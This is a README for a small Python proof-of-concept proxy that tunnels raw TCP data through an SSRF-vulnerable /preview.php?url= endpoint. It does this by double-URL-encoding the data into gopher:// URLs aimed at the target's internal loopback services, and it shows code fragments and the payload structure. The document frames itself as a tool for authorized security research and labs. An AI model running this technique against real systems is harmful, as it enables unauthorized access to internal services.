# SSRF Gopher Proxy

A small Python proof-of-concept proxy for **authorized SSRF testing and security research**.

The script listens for TCP connections on a local port, receives raw data from the client, URL-encodes the data twice, embeds it into a `gopher://` URL, and submits that URL to a target HTTP endpoint.

> **Warning:** Use this tool only against systems you own or have explicit permission to test.

## Overview

The proxy implements the following flow:

```text
Local client
    |
    | TCP request
    v
Python proxy
    |
    | double URL encoding
    v
HTTP request to target
    |
    | /preview.php?url=gopher://...
    v
Target SSRF endpoint
    |
    v
Configured internal host:port
```

The target URL generated by the script follows this structure:

```text
http://TARGET_HOST/preview.php?url=gopher://HOST_TO_PROXY:PORT_TO_PROXY/_ENCODED_DATA
```

The response returned by the HTTP endpoint is then written back to the connected local client.

## Configuration

Before running the script, configure the constants at the beginning of the file:

```python
LHOST = "127.0.0.1"
LPORT = 8080

TARGET_HOST = "TARGET_IP"

HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 80
```

### `LHOST`

Local interface on which the proxy listens.

The default:

```python
LHOST = "127.0.0.1"
```

restricts access to the local machine.

### `LPORT`

Local TCP port used by the proxy.

For example:

```python
LPORT = 8080
```

The original placeholder:

```python
LPORT = Target port
```

must be replaced with a valid integer before the script can run.

### `TARGET_HOST`

Host containing the SSRF-capable endpoint.

Example placeholder:

```python
TARGET_HOST = "TARGET_IP"
```

The script expects the endpoint:

```text
/preview.php
```

with a `url` query parameter.

### `HOST_TO_PROXY`

Destination host referenced by the generated `gopher://` URL.

The supplied script uses:

```python
HOST_TO_PROXY = "127.0.0.1"
```

From the SSRF server's perspective, this normally refers to its own loopback interface.

### `PORT_TO_PROXY`

Destination TCP port referenced by the generated `gopher://` URL.

The supplied configuration uses:

```python
PORT_TO_PROXY = 80
```

## Usage

After configuring the script, run:

```bash
python3 proxy.py
```

The console should display:

```text
Listening on 127.0.0.1:8080, proxying to 127.0.0.1:80 via TARGET_IP...
```

The proxy will continue listening for incoming TCP connections until it is terminated.

## How It Works

### 1. TCP Listener

The program creates a TCP socket:

```python
socket.socket(
    socket.AF_INET,
    socket.SOCK_STREAM
)
```

It binds the socket to:

```text
LHOST:LPORT
```

and waits for incoming connections.

### 2. Receiving Data

For each connection, the proxy reads up to:

```text
65536 bytes
```

from the client.

The received bytes represent the payload that will subsequently be placed into the generated URL.

### 3. URL Encoding

The script performs URL encoding twice:

```python
double_encoded_data = urllib.parse.quote(
    urllib.parse.quote(data)
)
```

The resulting value is incorporated into a `gopher://` URL.

> Depending on the Python version and input type, `urllib.parse.quote()` may require conversion of received bytes to an appropriate string representation. The current implementation should therefore be tested in a controlled environment before relying on it.

### 4. Gopher URL Construction

The script constructs a target URL equivalent to:

```text
http://TARGET_HOST/preview.php?url=gopher://HOST_TO_PROXY:PORT_TO_PROXY/_DATA
```

Conceptually:

```text
gopher://127.0.0.1:80/_<encoded TCP data>
```

The exact interpretation of this URL depends on the behavior of the target application and its URL-fetching implementation.

### 5. HTTP Request

The generated URL is submitted using:

```python
requests.get(target_url)
```

The script therefore assumes that the target application accepts a URL through:

```text
GET /preview.php?url=...
```

### 6. Returning the Response

The HTTP response body is returned to the locally connected client:

```python
conn.sendall(resp.content)
```

This makes the script behave as a basic bridge between the local TCP client and the target HTTP endpoint.

## Threading

Each accepted connection is processed in a separate daemon thread:

```python
threading.Thread(
    target=handle_client,
    args=(conn, addr),
    daemon=True,
)
```

This allows the listener to accept another connection while an existing request is being processed.

The implementation is intentionally minimal and does not provide production-grade connection management.

## Limitations

This is a proof-of-concept research script rather than a general-purpose proxy.

Notable limitations include:

* no authentication;
* no access control beyond the configured bind address;
* no TLS listener;
* only one `recv()` call per connection;
* maximum initial read size of 65,536 bytes;
* no request streaming;
* no explicit HTTP timeout;
* limited exception handling;
* no validation of the generated target URL;
* no validation that the requested destination is reachable;
* no graceful shutdown handling;
* behavior depends on the target application's URL-fetching implementation;
* the target endpoint and parameter name are hard-coded.

The proxy should therefore be used only in controlled testing environments.

## Security Considerations

Keep:

```python
LHOST = "127.0.0.1"
```

unless there is a specific reason to expose the listener to another interface.

Binding to:

```text
0.0.0.0
```

could make the proxy accessible to other systems on the network.

Because the script forwards arbitrary received data through a server-side URL-fetching endpoint, it should never be exposed as a public service.

## Authorized Testing

Suitable environments include:

* your own applications;
* CTF or security training environments;
* intentionally vulnerable labs;
* penetration tests with explicit authorization;
* local SSRF research environments.

Do not use the proxy to access internal services or systems without authorization.

## Troubleshooting

### `SyntaxError` around `LPORT`

The supplied code contains:

```python
LPORT = Target port
```

This is a placeholder rather than valid Python.

Replace it with an integer:

```python
LPORT = 8080
```

### Connection Refused

Verify that:

* the configured local port is available;
* the proxy is running;
* the client connects to the correct `LHOST:LPORT`;
* local firewall rules allow the connection.

### Target Request Fails

Check:

* `TARGET_HOST`;
* whether `/preview.php` exists;
* whether it accepts a `url` parameter;
* network connectivity;
* whether the URL scheme is permitted by the target application.
